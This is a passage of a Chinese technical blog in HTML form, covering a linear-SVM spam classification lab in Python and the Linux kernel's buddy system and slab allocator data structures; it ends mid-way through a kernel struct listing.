class="string">&#x27;httpaddr&#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># 中间带“@”的字符串被视为电子邮件 --&gt; &#x27;emailaddr&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;[^\s]+@[^\s]+&#x27;</span>, <span class="string">&#x27;emailaddr&#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># &#x27;$&#x27;符号被替换为&#x27;dollar&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;[$]+&#x27;</span>, <span class="string">&#x27;dollar&#x27;</span>, email_contents)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ===================== Tokenize Email =====================</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;==== Processed Email ====&#x27;</span>)</span><br><span class="line">    stemmer = nltk.stem.porter.PorterStemmer() <span class="comment"># 英文词干提取算法(Porter stemmer)</span></span><br><span class="line">    <span class="comment">#print(&#x27;email contents : &#123;&#125;&#x27;.format(email_contents)) # 输出电子邮件</span></span><br><span class="line">    tokens = re.split(<span class="string">&#x27;[@$/#.-:&amp;*+=\[\]?!()&#123;\&#125;,\&#x27;\&quot;&gt;_&lt;;% ]&#x27;</span>, email_contents) <span class="comment"># 对电子邮件进行拆分</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> tokens:</span><br><span class="line">        token = re.sub(<span class="string">&#x27;[^a-zA-Z0-9]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, token) <span class="comment"># 用正则来匹配合适的字符</span></span><br><span class="line">        token = stemmer.stem(token)</span><br><span class="line">        vocab_value_list = <span class="built_in">list</span>(vocab_list.values())</span><br><span class="line">        vocab_key_list = <span class="built_in">list</span>(vocab_list.keys())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(token) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            num = vocab_key_list[vocab_value_list.index(token)]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        word_indices.append(np.array(num))</span><br><span class="line">        <span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;==================&#x27;</span>)</span><br><span class="line">    word_indices = np.array(word_indices) <span class="comment"># 从&#x27;list&#x27;转化为&#x27;numpy.array&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> word_indices</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vocab_list</span>():</span> <span class="comment"># 导入词汇表</span></span><br><span class="line">    vocab_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/vocab.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            (val, key) = line.split()</span><br><span class="line">            vocab_dict[<span class="built_in">int</span>(val)] = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vocab_dict</span><br></pre></td></tr></table></figure>
<p>具体实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 1.电子邮件预处理 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Preprocessing sample email (emailSample1.txt) ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_contents = <span class="built_in">open</span>(<span class="string">&#x27;data/emailSample1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">word_indices = pe.process_email(file_contents)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print stats</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Word Indices: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(word_indices)</span><br></pre></td></tr></table></figure>
<h2 id="Extracting-Features-from-Emails（从电子邮件中提取特征）"><a href="#Extracting-Features-from-Emails（从电子邮件中提取特征）" class="headerlink" title="Extracting Features from Emails（从电子邮件中提取特征）"></a>Extracting Features from Emails（从电子邮件中提取特征）</h2><p>您现在应该完成 emailFeatures.m 中的代码，以在给定单词索引的情况下为电子邮件生成特征向量</p>
<ul>
<li>您现在将实现将每封电子邮件转换为 Rn 中的向量的特征提取，对于本练习，您将在词汇表中使用 n = # 个单词</li>
<li>具体来说，电子邮件的特征 xi（“0” or “1”）对应于字典中的第 i 个单词是否出现在电子邮件中<ul>
<li>如果电子邮件中存在第 i 个单词，则 xi = 1</li>
<li>如果电子邮件中不存在第 i 个单词，则 xi = 0</li>
</ul>
</li>
<li>因此，对于典型的电子邮件，此功能看起来像您现在应该完成 emailFeatures.m 中的代码用于生成电子邮件的特征向量，给定单词 indices</li>
</ul>
<p>特征提取函数 emailFeatures 的实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_features</span>(<span class="params">word_indices</span>):</span></span><br><span class="line">    n = <span class="number">1899</span></span><br><span class="line">    features = np.zeros(n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(word_indices)):</span><br><span class="line">        j = word_indices[i]</span><br><span class="line">        features[j]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> features</span><br></pre></td></tr></table></figure>
<ul>
<li>有点类似于位图</li>
<li>word_indices 就是邮件的各个单词提取出来后，在单词表中的位置</li>
<li>创建数组 features（各个条目初始化为“0”），然后把对应位置的值置为“1”</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 2.特征提取 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Extracting Features from sample email (emailSample1.txt) ... &#x27;</span>)</span><br><span class="line"></span><br><span class="line">features = ef.email_features(word_indices) <span class="comment"># 提取特征</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印统计数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Length of feature vector: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(features.size))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Number of non-zero entries: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.flatnonzero(features).size))</span><br></pre></td></tr></table></figure>
<h2 id="Training-SVM-for-Spam-Classification（为垃圾邮件分类训练-SVM）"><a href="#Training-SVM-for-Spam-Classification（为垃圾邮件分类训练-SVM）" class="headerlink" title="Training SVM for Spam Classification（为垃圾邮件分类训练 SVM）"></a>Training SVM for Spam Classification（为垃圾邮件分类训练 SVM）</h2><p>完成特征提取功能后，ex6 spam.m 的下一步将加载一个预处理的训练数据集，该数据集将用于训练 SVM 分类器</p>
<ul>
<li>spamTrain.mat 包含 4000 个垃圾邮件和非垃圾邮件的训练示例</li>
<li>spamTest.mat 包含 1000 个测试示例</li>
<li>每封原始电子邮件都使用 processEmail 和 emailFeatures 函数进行处理，并转换为向量 x(i)</li>
<li>加载数据集后，ex6 spam.m 将继续训练 SVM 以在垃圾邮件（y=1）和非垃圾邮件（y=0）之间进行分类，训练完成后，您应该看到分类器的训练准确率约为 99.8%，测试准确率约为 98.5%</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 3.为垃圾邮件分类训练线性SVM =====================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/spamTrain.mat&#x27;</span>)</span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training Linear SVM (Spam Classification)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;(this may take 1 to 2 minutes)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="number">0.1</span></span><br><span class="line">clf = svm.SVC(c, kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, y)</span><br><span class="line"></span><br><span class="line">p = clf.predict(X)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training Accuracy: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(p == y) * <span class="number">100</span>))</span><br></pre></td></tr></table></figure>
<p>接下来进行测试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 4.测试垃圾邮件分类 =====================</span></span><br><span class="line"></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/spamTest.mat&#x27;</span>)</span><br><span class="line">Xtest = data[<span class="string">&#x27;Xtest&#x27;</span>]</span><br><span class="line">ytest = data[<span class="string">&#x27;ytest&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Evaluating the trained linear SVM on a test set ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = clf.predict(Xtest) <span class="comment"># 预测SVM的结果</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Test Accuracy: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(p == ytest) * <span class="number">100</span>))</span><br></pre></td></tr></table></figure>
<h2 id="Top-Predictors-for-Spam（垃圾邮件的主要预测指标）"><a href="#Top-Predictors-for-Spam（垃圾邮件的主要预测指标）" class="headerlink" title="Top Predictors for Spam（垃圾邮件的主要预测指标）"></a>Top Predictors for Spam（垃圾邮件的主要预测指标）</h2><p>为了更好地理解垃圾邮件分类器的工作原理，我们可以检查参数以查看分类器认为哪些词最能预测垃圾邮件</p>
<ul>
<li>ex6_spam.m 的下一步是在分类器中找到具有最大正值的参数（最高频）并显示相应的单词</li>
<li>因此，如果一封电子邮件包含诸如“保证”、“删除”、“美元”和“价格”之类的词（垃圾邮件的高频词汇），它很可能被归类为垃圾邮件</li>
</ul>
<p>由于我们正在训练的模型是线性 SVM，我们可以检查模型学习的 w 权重，以更好地了解它如何确定电子邮件是否为垃圾邮件，以下代码查找分类器中权重最高的单词，非正式地，分类器“认为”这些词最有可能是垃圾邮件的指标</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 5.垃圾邮件的主要预测指标 =====================</span></span><br><span class="line"></span><br><span class="line">vocab_list = pe.get_vocab_list() <span class="comment"># 导入词汇表</span></span><br><span class="line">indices = np.argsort(clf.coef_).flatten()[::-<span class="number">1</span>] <span class="comment"># &quot;-1&quot;代表倒置,顺序改为从大到小了</span></span><br><span class="line"><span class="built_in">print</span>(indices)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; (&#123;:0.6f&#125;)&#x27;</span>.<span class="built_in">format</span>(vocab_list[indices[i]], clf.coef_.flatten()[indices[i]]))</span><br></pre></td></tr></table></figure>
<ul>
<li>argsort(arr)：返回的是元素值从小到大排序后的索引值的数组</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653370935191.png" class width="1653370935191"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/23/BuddySystem&Slab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/23/BuddySystem&Slab/" class="post-title-link" itemprop="url">BuddySystem&Slub</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-23 23:39:41" itemprop="dateCreated datePublished" datetime="2022-05-23T23:39:41+08:00">2022-05-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-22 13:26:30" itemprop="dateModified" datetime="2022-06-22T13:26:30+08:00">2022-06-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h2><p><strong>伙伴关系</strong></p>
<p>伙伴关系的定义为：由一个母实体分成的两个各方面属性一致的两个子实体，这两个子实体就处于伙伴关系</p>
<ul>
<li>在操作系统分配内存的过程中，一个内存块经常被分成两个大小相等的内存块，这两个大小相等的内存块就处于伙伴关系</li>
<li>它满足3个条件：<ul>
<li>两个块具有相同大小</li>
<li>物理地址是连续的</li>
<li>从同一个大块中拆分出来</li>
</ul>
</li>
</ul>
<p><strong>伙伴系统</strong></p>
<p>伙伴系统（buddy system）是内核中用来管理物理内存的一种算法，Linux2.6 为每个管理区使用不同的伙伴系统，内核空间分为三种区，DMA，NORMAL，HIGHMEM，对于每一种区，都有对应的伙伴算法</p>
<ul>
<li>我们知道内存中有一些是被内核代码占用，还有一些是被特殊用途所保留，那么剩余的空闲内存都会交给内核内存管理系统来进行统一管理和分配</li>
<li>内核中会把内存按照页来组织分配，随着进程的对内存的申请和释放，系统的内存会不断的区域碎片化</li>
<li>到最后会发现，明明系统还有很多空闲内存，却无法分配出一块连续的内存，这对于系统来说并不是好事</li>
</ul>
<p>伙伴系统（buddy system）把系统中要管理的物理内存按照页面个数分为了 11 个组，分别对应11种大小不同的连续内存块，每组中的内存块大小都相等，且必须是 2 的 n 次幂 (Pow(2, n))，即 1, 2, 4, 8, 16, 32, 64, 128 … 1024 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include\linux\mmzone.h */</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER 11</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span> <span class="comment">/* 不同大小的空闲区域 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span> <span class="comment">/* 内存块链表连接时只需把内存块的第一个页关联即可(都是连续的) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nr_free; <span class="comment">/* 表示这种内存块(包括所有迁移类型)的数量 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>那么系统中就存在 2^0~2^10 这么11种大小不同的内存块，对应内存块大小为 4KB ~ 4M 内核用 11 个链表来管理 11 种大小不同的内存块</li>
</ul>
<p>伙伴分配器的数据结构在逻辑上的表示就像是一个完全二叉树，大概像这样： </p>
<img src="/2022/05/23/BuddySystem&Slab/1653288150250-1653726952169-1655875583491.png" class width="1653288150250">  
<ul>
<li>当然实际编码过程中并不会使用一个 struct TreeNode 的形式去把二叉树的各个节点用指针连起来，因为是这个树一定是完全二叉树，所以可以使用一个数组来表示树的结构</li>
<li>用这一个数组，就可以表示所有节点的位置信息</li>
</ul>
<p>当一个页面被等分时，它自己也就不存在了：</p>
<img src="/2022/05/23/BuddySystem&Slab/1653445033299-1655875583491.png" class width="1653445033299"> 
<p><strong>位图管理</strong></p>
<p>为了便于页面的维护，将多个页面组成内存块，每个内存块都有 “2的方幂” 个页，方幂的指数被称为阶</p>
<p>在操作内存时，经常将这些内存块分成大小相等的两个块，分成的两个内存块被称为伙伴块，采用 “一位二进制数” 来表示它们的伙伴关系</p>
<p>系统根据该位为 “0” 或位为 “1” 来决定是否使用或者分配该页面块，系统每次分配和回收伙伴块时都要对它们的伙伴位跟 “1” 进行异或运算</p>
<ul>
<li>刚开始时，父块还没有等分，所以伙伴块不存在（也可以认为是：两个伙伴块都空闲），它们的伙伴位为 “0”</li>
<li>如果需要等分，则把第一块插入下一级，第二块分配出去，异或后得 “1”（只使用了一个块）</li>
<li>如果另一块也被使用，异或后得 “0”（两个块都使用了）</li>
<li>如果前面一块回收了异或后得 “1”</li>
<li>如果另一块也回收了异或后得 “0”</li>
</ul>
<p>整理一下便是：</p>
<ul>
<li>当这个位为 “1”，表示其中一块在使用</li>
<li>当这个位为 “0”，表示两个页面块都在使用（一个完整的块不会分为两个空块）</li>
</ul>
<p>注意：这个 “一位二进制数” 存储在 “位图 map” 中</p>
<p><strong>空闲内存块管理</strong></p>
<p>下图可以展示 free_area 的整体结构：</p>
<img src="/2022/05/23/BuddySystem&Slab/1653288462902-1653726952170-1655875583491.png" class width="1653288462902">  
<img src="/2022/05/23/BuddySystem&Slab/1653447102092-1655875583491.png" class width="1653447102092"> 
<ul>
<li>free_area 就是一个数组，存放有许多 free_list</li>
<li>每个 free_list（free_area[x]）都有一个 map 位图（用于表示各个伙伴块的关系）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下图就是一个 free_list（free_area[x]）的结构：</p>
<img src="/2022/05/23/BuddySystem&Slab/1653288764042-1653726952170-1655875583491.png" class width="1653288764042"> 
<img src="/2022/05/23/BuddySystem&Slab/1653447624502-1655875583492.png" class width="1653447624502"> 
<ul>
<li>free_list（free_area[x]）用于链接 “2的n次方” 组成的内存块</li>
<li>map 中的一个“二进制位”表示两个伙伴块的关系</li>
</ul>
<p><strong>重要结构体</strong></p>
<ul>
<li>页（page）：一个 page 结构表示一个物理内存页面</li>
<li>区（zone）：因为硬件限制，Linux 内核不能把所有的物理内存页统一对待，把属性相同的物理内存页面归结到了一个区中</li>
<li>节点（pglist_data）：pglist_data 结构中包含了 zonelist 数组，第一个 zonelist 类型的元素指向本节点内的 zone 数组，第二个 zonelist 类型的元素指向其它节点的 zone 数组，而一个 zone 结构中的 free_area 数组中又挂载着 page 结构</li>
</ul>
<img src="/2022/05/23/BuddySystem&Slab/1653305919635-1653726952170-1655875583492.png" class width="1653305919635"> 
<p><strong>伙伴算法-分配流程</strong></p>
<p>我先从 free_area 的角度继续分析，假如系统需要 4(2x2) 个页面大小的内存块：</p>
<ul>
<li>该算法首先到 free_area[2] 中查找：<ul>
<li>如果链表中有空闲块：就直接从中摘下并分配出去</li>
<li>如果没有：算法将顺着数组向上查找 free_area[3]<ul>
<li>如果 free_area[3] 中有空闲块：则将其从链表中摘下，分成等大小的两部分，前 4 个页面作为一个块插入 free_area[2] 的链表头部，后 4 个页面分配出去</li>
<li>如果 free_area[3] 中也没有：就再向上查找 free_area[4]<ul>
<li>如果 free_area[4] 中有：就将这 16(2x2x2x2) 个页面等分成两份，前一半的 8 个页挂 free_area[3] 的链表头部，后一半的 8 个页再次等分为 2 个 4 页，前一半挂 free_area[2] 的链表中，后一半分配出去</li>
<li>假如 free_area[4] 也没有：则重复上面的过程，知道到达 free_area 数组的最后，如果还没有则放弃分配</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>free_area 中只存放空闲块，从空闲块的视角来看的话：<ul>
<li>从小到大进行查找，优先分配小块</li>
<li>如果没有小块，就等分大块，前半部分插入下一级链表头部，后半部分进行分配</li>
<li>如果后半部分仍然可以等分，就重复进行“等分插链”的操作</li>
</ul>
</li>
</ul>
<p><strong>伙伴算法-释放流程</strong></p>
<p>内存的释放是分配的逆过程，也可以看作是伙伴的合并过程</p>
<ul>
<li>当释放一个块时，先在其对应的链表中考查是否有伙伴存在<ul>
<li>如果没有伙伴块：就直接把要释放的块挂入链表头</li>
<li>如果有：则从链表中摘下伙伴，合并成一个大块，然后继续考察合并后的块在更大一级链表中是否有伙伴存在，直到不能合并或者已经合并到了最大的块</li>
</ul>
</li>
</ul>
<p>PS：整个过程中，位图扮演了重要的角色，位图的某一位对应两个互为伙伴的块</p>
<ul>
<li>为“1”表示其中一块已经分配出去了，为“0”表示两块都都分配出去了</li>
<li>伙伴中无论是分配还是释放都只是相对的位图进行异或操作，释放过程根据位图判断伙伴是否存在<ul>
<li>如果对相应位的异或操作得“1”（原本是“0”），代表没有伙伴可以合并</li>
<li>如果异或操作得“0”（原本是“1”），代表伙伴块中的另一个已经空闲，可以进行合并</li>
<li>并且继续按这种方式合并伙伴，直到不能合并为止</li>
</ul>
</li>
</ul>
<h2 id="Slab分配器"><a href="#Slab分配器" class="headerlink" title="Slab分配器"></a>Slab分配器</h2><p><strong>slab的出现</strong></p>
<p>我们知道内核中的物理内存由伙伴系统（buddy system）进行管理，它的分配粒度是以物理页帧（page）为单位的，但内核中有大量的数据结构只需要若干 bytes 的空间，倘若仍按页来分配，势必会造成大量的内存被浪费掉</p>
<p>slab 分配器的出现（而 slub 是 slab 的衍生产物），就是为了解决内核中这些小块内存分配与管理的难题</p>
<p>slab 分配器，把常用的数据结构都看成一个个对象</p>
<ul>
<li>我们知道 buddy 分配器的分配单元是以页为单位的，然后将不同 order 的空闲物理页帧串成若干链表，分配时从对应链表里取出</li>
<li>而 slab 分配器则是以目标数据结构为单分配单元，且会将目标数据结构提前分配并串成链表，分配时从中取用</li>
</ul>
<p>从 2.6 内核开始对 slab 分配器的实现添加了两个备选方案 slub 和 slob（用 slub 比较多）</p>
<ul>
<li>slub 就是在之前 slab 上优化后的一个产物，去除了许多臃肿的实现，逐渐会完全替代老的 slab</li>
<li>而 slob 则是一个很轻量级的 slab 实现，代码量不大，官方说适合一些嵌入式设备</li>
</ul>
<img src="/2022/05/23/BuddySystem&Slab/1653316705399-1653726952170-1655875583492.png" class width="1653316705399">  
<p><strong>重要结构体</strong></p>
<p>这里有个复杂且重要的结构体：struct kmem_cache，即 <strong>缓存描述符</strong>（缓存器），准确的来说它并不包含实际的缓存空间，而是包含了一些缓存的管理数据，和指向实际缓存空间的指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* \linux-4.19.26\include\linux\slab_def.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> __<span class="title">percpu</span> *<span class="title">cpu_cache</span>;</span> <span class="comment">/* 本地高速缓存,每CPU结构对象释放时,优先放入这个本地CPU高速缓存中 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1) Cache tunables. Protected by slab_mutex */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> batchcount; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> limit; <span class="comment">/* 本地高速缓存中entry数组中空闲obj的最大数目 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> shared; <span class="comment">/* CPU共享高速缓存标志,实际地址保存在kmem_cache_node结构中 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">/* 对象长度+填充字节 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_buffer_size</span>;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 2) touched by every alloc &amp; free from the backend */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags; <span class="comment">/* 属性的flag标志,如果SLAB管理结构放在外部,则CFLAGS_OFF_SLAB置&#x27;1&#x27; */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num; <span class="comment">/* 每个slab中obj数量 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3) cache_grow/shrink */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> gfporder; <span class="comment">/* 每个slab页块的阶(一个slab由2^gfporder个页构) */</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags; <span class="comment">/* 从伙伴系统分配页,补足slab时,页分配的gfp码 */</span></span><br><span class="line">	<span class="keyword">size_t</span> colour; <span class="comment">/* 缓存着色范围 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> colour_off; <span class="comment">/* 一个cache colour的长度(和一个cache line的大小相同) */</span></span><br><span class="line">    </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">freelist_cache</span>;</span> <span class="comment">/* 空闲对象链表放在slab外部时使用,管理用于slab对象管理结构中freelist成员的缓存,也就是又一个新缓存 */</span></span><br><span class="line">	<span 